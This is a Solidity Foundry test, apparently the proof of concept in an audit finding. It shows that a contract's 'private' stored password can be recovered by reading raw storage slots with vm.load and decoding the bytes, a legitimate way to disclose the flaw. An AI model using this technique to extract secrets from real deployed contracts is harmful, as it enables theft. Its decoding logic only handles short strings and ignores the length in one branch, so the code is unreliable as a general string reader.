## PoC - test_anyone_can_see_the_stored_password:

```solidity
function test_anyone_can_see_the_stored_password() public {
    // owner sets their password
    string memory expectedPassword = "super$3cureP@$$w0rd believe me it's really a secure password!";
    vm.startPrank(owner);
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // owner checks their password
    vm.startPrank(owner);
    string memory storedPassword = passwordStore.getPassword();
    vm.stopPrank();
    console.log("password: ", storedPassword);

    // owner verifies their stored password
    assert(bytes(storedPassword).length > 0);
    assertEq(storedPassword, expectedPassword);

    // Adversary comes in to steal the password...
    // bytes32 storageSlot = keccak256(abi.encodePacked(uint256(1)));
    bytes32 storageSlot = bytes32(uint256(1));

    bytes32 storedData = vm.load(address(passwordStore), storageSlot);

    uint256 storedDataLength = uint256(uint8(storedData[31]) / 2);

    string memory actualPassword;
    if (storedDataLength < 32) {
        for (uint256 i; i < 31; i++) {
            actualPassword = string(abi.encodePacked(actualPassword, storedData[i]));
        }
    } else {
        uint256 numChunks = storedDataLength % 32 == 0 ? (storedDataLength / 32) : (storedDataLength / 32) + 1;

        for (uint256 i; i < numChunks; i++) {
            storageSlot = bytes32(uint256(keccak256(abi.encodePacked(uint256(1)))) + i);
            storedData = vm.load(address(passwordStore), storageSlot);

            bool dataFlag;
            string memory passwordChunk;
            for (uint256 j = 31; j >= 0; j--) {
                if (storedData[j] == 0x00 && !dataFlag) continue;
                if (storedData[j] != 0x00 && !dataFlag) dataFlag = true;

                passwordChunk = string(abi.encodePacked(storedData[j], passwordChunk));
                if (j == 0) break;
            }
            actualPassword = string(abi.encodePacked(actualPassword, passwordChunk));
        }
    }

    console.log("expected password: ", expectedPassword);
    console.log("actual password  : ", actualPassword);
    console.log("expected password length: ", bytes(expectedPassword).length);
    console.log("actual password   length: ", bytes(actualPassword).length);
    assertEq(bytes(expectedPassword).length, bytes(actualPassword).length);
    assertEq(expectedPassword, actualPassword);
}
```